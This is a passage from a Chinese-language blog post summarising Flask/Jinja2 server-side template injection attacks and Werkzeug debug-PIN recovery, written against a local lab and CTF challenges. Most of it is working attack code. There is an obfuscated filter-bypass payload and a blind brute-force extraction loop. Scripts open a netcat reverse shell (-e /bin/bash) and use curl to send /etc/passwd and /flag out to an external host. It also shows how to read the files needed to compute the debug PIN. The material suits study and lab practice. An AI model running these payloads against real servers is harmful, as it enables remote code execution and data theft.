</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>50</span><span class=p>):</span> 
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=n>s</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>        <span class=n>x</span><span class=o>=</span><span class=n>flag</span><span class=o>+</span><span class=n>j</span> 
</span></span><span class=line><span class=cl>        <span class=n>u</span><span class=o>=</span><span class=n>url</span><span class=o>+</span><span class=n>ccchr</span><span class=p>(</span><span class=n>x</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;%}&#39;</span><span class=o>+</span><span class=s1>&#39;{</span><span class=si>% i</span><span class=s1>f x.open(cmd).read(&#39;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;)==cmd2%}&#39;</span><span class=o>+</span><span class=s1>&#39;1341&#39;</span><span class=o>+</span><span class=s1>&#39;{</span><span class=si>% e</span><span class=s1>ndif%}&#39;</span> 
</span></span><span class=line><span class=cl>        <span class=c1>#print(u)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>u</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=s2>&#34;1341&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>):</span> 
</span></span><span class=line><span class=cl>            <span class=n>flag</span><span class=o>=</span><span class=n>x</span> 
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 反弹shell </span>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span> <span class=nb>set</span> <span class=n>a</span><span class=o>=</span><span class=p>(()</span><span class=o>|</span><span class=n>select</span><span class=o>|</span><span class=n>string</span><span class=o>|</span><span class=nb>list</span><span class=p>)</span><span class=o>.</span><span class=n>pop</span><span class=p>(</span><span class=mi>24</span><span class=p>)</span><span class=o>%</span><span class=p>}</span> 
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span> <span class=nb>set</span> <span class=n>ini</span><span class=o>=</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>a</span><span class=p>,</span><span class=nb>dict</span><span class=p>(</span><span class=n>init</span><span class=o>=</span><span class=n>a</span><span class=p>)</span><span class=o>|</span><span class=n>join</span><span class=p>,</span><span class=n>a</span><span class=p>,</span><span class=n>a</span><span class=p>)</span><span class=o>|</span><span class=n>join</span><span class=p>()</span><span class=o>%</span><span class=p>}</span> 
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span> <span class=nb>set</span> <span class=n>glo</span><span class=o>=</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>a</span><span class=p>,</span><span class=nb>dict</span><span class=p>(</span><span class=nb>globals</span><span class=o>=</span><span class=n>a</span><span class=p>)</span><span class=o>|</span><span class=n>join</span><span class=p>,</span><span class=n>a</span><span class=p>,</span><span class=n>a</span><span class=p>)</span><span class=o>|</span><span class=n>join</span><span class=p>()</span><span class=o>%</span><span class=p>}</span> 
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span> <span class=nb>set</span> <span class=n>geti</span><span class=o>=</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>a</span><span class=p>,</span><span class=nb>dict</span><span class=p>(</span><span class=n>getitem</span><span class=o>=</span><span class=n>a</span><span class=p>)</span><span class=o>|</span><span class=n>join</span><span class=p>,</span><span class=n>a</span><span class=p>,</span><span class=n>a</span><span class=p>)</span><span class=o>|</span><span class=n>join</span><span class=p>()</span><span class=o>%</span><span class=p>}</span> 
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span> <span class=nb>set</span> <span class=n>built</span><span class=o>=</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>a</span><span class=p>,</span><span class=nb>dict</span><span class=p>(</span><span class=n>builtins</span><span class=o>=</span><span class=n>a</span><span class=p>)</span><span class=o>|</span><span class=n>join</span><span class=p>,</span><span class=n>a</span><span class=p>,</span><span class=n>a</span><span class=p>)</span><span class=o>|</span><span class=n>join</span><span class=p>()</span><span class=o>%</span><span class=p>}</span> 
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span> <span class=nb>set</span> <span class=n>x</span><span class=o>=</span><span class=p>(</span><span class=n>q</span><span class=o>|</span><span class=n>attr</span><span class=p>(</span><span class=n>ini</span><span class=p>)</span><span class=o>|</span><span class=n>attr</span><span class=p>(</span><span class=n>glo</span><span class=p>)</span><span class=o>|</span><span class=n>attr</span><span class=p>(</span><span class=n>geti</span><span class=p>))(</span><span class=n>built</span><span class=p>)</span><span class=o>%</span><span class=p>}</span> 
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span> <span class=nb>set</span> <span class=nb>chr</span><span class=o>=</span><span class=n>x</span><span class=o>.</span><span class=n>chr</span><span class=o>%</span><span class=p>}</span> 
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span> <span class=nb>set</span> <span class=n>cmd</span><span class=o>=</span> <span class=o>%</span><span class=p>}</span> 
</span></span><span class=line><span class=cl><span class=c1># cmd用后面的脚本生成 </span>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span><span class=k>if</span> <span class=n>x</span><span class=o>.</span><span class=n>eval</span><span class=p>(</span><span class=n>cmd</span><span class=p>)</span><span class=o>%</span><span class=p>}</span> 
</span></span><span class=line><span class=cl><span class=mi>123</span> 
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span><span class=n>endif</span><span class=o>%</span><span class=p>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>s</span><span class=o>=</span><span class=s1>&#39;__import__(&#34;os&#34;).popen(&#34;curl http://xxx:4567?p=`cat /flag`&#34;).read()&#39;</span> 
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ccchr</span><span class=p>(</span><span class=n>s</span><span class=p>):</span> <span class=n>t</span><span class=o>=</span><span class=s1>&#39;&#39;</span> 
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>s</span><span class=p>)):</span> 
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>i</span><span class=o>&lt;</span><span class=nb>len</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=o>-</span><span class=mi>1</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>            <span class=n>t</span><span class=o>+=</span><span class=s1>&#39;chr(&#39;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>s</span><span class=p>[</span><span class=n>i</span><span class=p>]))</span><span class=o>+</span><span class=s1>&#39;)%2b&#39;</span> 
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>            <span class=n>t</span><span class=o>+=</span><span class=s1>&#39;chr(&#39;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>s</span><span class=p>[</span><span class=n>i</span><span class=p>]))</span><span class=o>+</span><span class=s1>&#39;)&#39;</span> 
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>t</span>
</span></span></code></pre></div><h3 id=无回显ssti class=headerLink><a href=#%e6%97%a0%e5%9b%9e%e6%98%bessti class=header-mark></a>无回显SSTI</h3><h4 id=反弹shell class=headerLink><a href=#%e5%8f%8d%e5%bc%b9shell class=header-mark></a>反弹shell</h4><p>通过RCE反弹shell绕过无回显界面</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://localhost:8089/flasklab/level/3&#34;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>500</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;code&#34;</span><span class=p>:</span><span class=s2>&#34;{{().__class__.__base__.__subclasses__()[&#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;].__init__.__globals__[&#34;popen&#34;](&#34;netcat 192.168.23.128 5555 -e /bin/bash&#34;).read()}}&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span></code></pre></div><p>kali 上开启 netcat 端口监听</p><p><code>netcat -lvp 5555</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120419.jpeg title=85ea598163d5e0e01407e35333c48be0_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120419.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120419.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120419.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120419.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120419.jpeg 2x" sizes=auto alt=85ea598163d5e0e01407e35333c48be0_MD5></a></figure></p><h4 id=带外注入 class=headerLink><a href=#%e5%b8%a6%e5%a4%96%e6%b3%a8%e5%85%a5 class=header-mark></a>带外注入</h4><p>通过 requestbin 或 dnslog 方式讲信息传到外界</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://localhost:8089/flasklab/level/3&#34;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>500</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;code&#34;</span><span class=p>:</span><span class=s2>&#34;{{().__class__.__base__.__subclasses__()[&#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;].__init__.__globals__[&#34;popen&#34;](&#34;curl http://192.168.23.128/`cat /etc/passwd`&#34;).read()}}&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span></code></pre></div><p>kali 上开启 python http 监听</p><p><code>python3 -m http.server 80</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120474.jpeg title=b14f50d6a625a8a14118d6cbf1a8ad8b_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120474.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120474.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120474.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120474.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120474.jpeg 2x" sizes=auto alt=b14f50d6a625a8a14118d6cbf1a8ad8b_MD5></a></figure></p><h4 id=纯盲注 class=headerLink><a href=#%e7%ba%af%e7%9b%b2%e6%b3%a8 class=header-mark></a>纯盲注</h4><p>要有回显</p><h2 id=python-debug-pin码计算 class=headerLink><a href=#python-debug-pin%e7%a0%81%e8%ae%a1%e7%ae%97 class=header-mark></a>python debug pin码计算</h2><h3 id=pin码 class=headerLink><a href=#pin%e7%a0%81 class=header-mark></a>pin码</h3><p>对于有文件包含或文件读取的漏洞，且<strong>开启debug功能</strong>，想要执行指令还需要输入pin码</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120650.jpeg title=825602bdcaf5d5ad5ee34b75ef6b1a34_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120650.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120650.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120650.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120650.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120650.jpeg 2x" sizes=auto alt=825602bdcaf5d5ad5ee34b75ef6b1a34_MD5></a></figure></p><h3 id=pin码生成原理 class=headerLink><a href=#pin%e7%a0%81%e7%94%9f%e6%88%90%e5%8e%9f%e7%90%86 class=header-mark></a>pin码生成原理</h3><p>pin码由六个参数构成</p><ol><li><code>username</code>执行代码时候的用户名</li><li><code>**getattr(app,"__name__",app.__class__.__name__)**</code><strong>&ndash;>Flask（一般固定）</strong></li><li><code>**modename**</code><strong>固定值默认flask.app</strong></li><li><code>getattr(mod,"__file__",None)</code>app.py文件所在路径</li><li><code>str(uuid.getnode())</code>电脑上的mac地址</li><li><code>get_machine_id()</code>根据操作系统不同有四种获取方式</li></ol><p>生成pin码Debugger PIN的代码是在<code>get_pin_and_cookie_name</code></p><h3 id=pin码计算ctf题目 class=headerLink><a href=#pin%e7%a0%81%e8%ae%a1%e7%ae%97ctf%e9%a2%98%e7%9b%ae class=header-mark></a>pin码计算CTF题目</h3><p><strong>flask debug 开启危害</strong></p><p>有文件包含或文件读取的漏洞，且开启debug功能</p><p>点击Read something会跳转页面</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120809.jpeg title=30f6ba7ecbd41d1af0b47a1118bb1e7f_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120809.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120809.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120809.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120809.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120809.jpeg 2x" sizes=auto alt=30f6ba7ecbd41d1af0b47a1118bb1e7f_MD5></a></figure></p><p>url可以进行修改，从而读取服务器部分文件</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120861.jpeg title=7adf1678285c79f5706565add6a99c50_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120861.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120861.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120861.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120861.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120861.jpeg 2x" sizes=auto alt=7adf1678285c79f5706565add6a99c50_MD5></a></figure></p><ol><li><code>/etc/passwd</code>可以看到用户名 <code>root</code>（1000以上一般人为创建）</li></ol><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120885.jpeg title=bc03d680be31315b0eb31e48690aefdb_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120885.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120885.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120885.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120885.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120885.jpeg 2x" sizes=auto alt=bc03d680be31315b0eb31e48690aefdb_MD5></a></figure></p><ol start=2><li>mac地址查看<code>/sys/class/net/eth0/address</code>(计算时转化为十进制)</li></ol><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120952.jpeg title=73101aaa89e26efc23d3e0c506ea4e6d_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120952.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120952.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120952.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120952.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120952.jpeg 2x" sizes=auto alt=73101aaa89e26efc23d3e0c506ea4e6d_MD5></a></figure></p><ol start=3><li><code>get_machine_id()</code></li></ol><p>查看<code>/etc/machine-id</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152121022.jpeg title=2a5bbf2778e7c2e4c8700a741cf25011_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152121022.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152121022.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152121022.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152121022.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152121022.jpeg 2x" sizes=auto alt=2a5bbf2778e7c2e4c8700a741cf25011_MD5></a></figure></p><p><code>/proc/self/cgroup</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152121266.jpeg title=f8cbe739ba2e1c2939d1f1d1a5964c18_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152121266.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152121266.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152121266.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152121266.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152121266.jpeg 2x" sizes=auto alt=f8cbe739ba2e1c2939d1f1d1a5964c18_MD5></a></figure></p><p>还需要一个报错界面，或者默认路径</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152121320.jpeg title=f19a7e4afb564a0cbc49bd45643bac4f_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152121320.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152121320.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152121320.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152121320.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152121320.jpeg 2x" sizes=auto alt=f19a7e4afb564a0cbc49bd45643bac4f_MD5></a></figure></p><p>最后跑一下</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152121424.jpeg title=60481d31efca75fc8563848ed630559e_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152121424.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152121424.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152121424.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152121424.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152121424.jpeg 2x" sizes=auto alt=60481d31efca75fc8563848ed630559e_MD5></a></figure></p></div><h2>相关内容</h2><div class=related-container><div class=related-item-container><h2 class=related-title><a href=/posts/python/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%BB%95%E8%BF%87/>Python沙盒逃逸绕过</a></h2></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 15159-1010-1510</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><button title="分享到 Twitter" data-sharer=twitter data-url=https://nexuzzz0.github.io/posts/python/ssti%E6%80%BB%E7%BB%93/ data-title=[SSTI]总结 data-hashtags=SSTI,Python><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer=facebook data-url=https://nexuzzz0.github.io/posts/python/ssti%E6%80%BB%E7%BB%93/ data-hashtag=SSTI><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 WhatsApp" data-sharer=whatsapp data-url=https://nexuzzz0.github.io/posts/python/ssti%E6%80%BB%E7%BB%93/ data-title=[SSTI]总结 data-web><span class="fab fa-whatsapp fa-fw"></span></button><button title="分享到 Line" data-sharer=line data-url=https://nexuzzz0.github.io/posts/python/ssti%E6%80%BB%E7%BB%93/ data-title=[SSTI]总结><span data-svg-src=/lib/simple-icons/icons/line.min.svg></span></button><button title="分享到 微博" data-sharer=weibo data-url=https://nexuzzz0.github.io/posts/python/ssti%E6%80%BB%E7%BB%93/ data-title=[SSTI]总结><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Myspace" data-sharer=myspace data-url=https://nexuzzz0.github.io/posts/python/ssti%E6%80%BB%E7%BB%93/ data-title=[SSTI]总结 data-description><span data-svg-src=/lib/simple-icons/icons/myspace.min.svg></span></button><button title="分享到 Blogger" data-sharer=blogger data-url=https://nexuzzz0.github.io/posts/python/ssti%E6%80%BB%E7%BB%93/ data-title=[SSTI]总结 data-description><span class="fab fa-blogger fa-fw"></span></button><button title="分享到 Evernote" data-sharer=evernote data-url=https://nexuzzz0.github.io/posts/python/ssti%E6%80%BB%E7%BB%93/ data-title=[SSTI]总结><span class="fab fa-evernote fa-fw"></span></button></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/ssti/>SSTI</a>,&nbsp;<a href=/tags/python/>Python</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/posts/php%E7%89%B9%E6%80%A7/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/ class=prev rel=prev title=[PHP特性]总结><i class="fas fa-angle-left fa-fw"></i>[PHP特性]总结</a>
<a href=/posts/python/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%BB%95%E8%BF%87/ class=next rel=next title=Python沙盒逃逸绕过>Python沙盒逃逸绕过<i class="fas fa-angle-right fa-fw"></i></a></div></div><div id=comments></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2023 - 2024</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div><div class=footer-line></div><div class=footer-line></div></div></footer></div><div id=fixed-buttons><a href=#back-to-top id=back-to-top-button class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw"></i>
</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw"></i></a></div><div class=assets><link rel=stylesheet href=/lib/katex/katex.min.css><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/katex/copy-tex.min.css><noscript><link rel=stylesheet href=/lib/katex/copy-tex.min.css></noscript><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:10},comment:{},data:{"desktop-header-typeit":"Nexuzzz0's BLOG","mobile-header-typeit":"Nexuzzz0's BLOG"},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{distance:100,findAllMatches:!1,highlightTag:"em",ignoreFieldNorm:!1,ignoreLocation:!1,isCaseSensitive:!1,location:0,maxResultLength:10,minMatchCharLength:2,noResultsFound:"没有找到结果",snippetLength:50,threshold:.3,useExtendedSearch:!1},sharerjs:!0,table:{sort:!0},typeit:{cursorChar:"|",cursorSpeed:1e3,data:{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},duration:-1,speed:100}}</script><script type=text/javascript src=/lib/tablesort/tablesort.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/sharer/sharer.min.js></script><script type=text/javascript src=/lib/typeit/typeit.min.js></script><script type=text/javascript src=/lib/katex/katex.min.js defer></script><script type=text/javascript src=/lib/katex/auto-render.min.js defer></script><script type=text/javascript src=/lib/katex/copy-tex.min.js defer></script><script type=text/javascript src=/lib/katex/mhchem.min.js defer></script><script type=text/javascript src=/js/katex.min.js defer></script><script type=text/javascript src=/js/theme.min.js defer></script></div></body></html>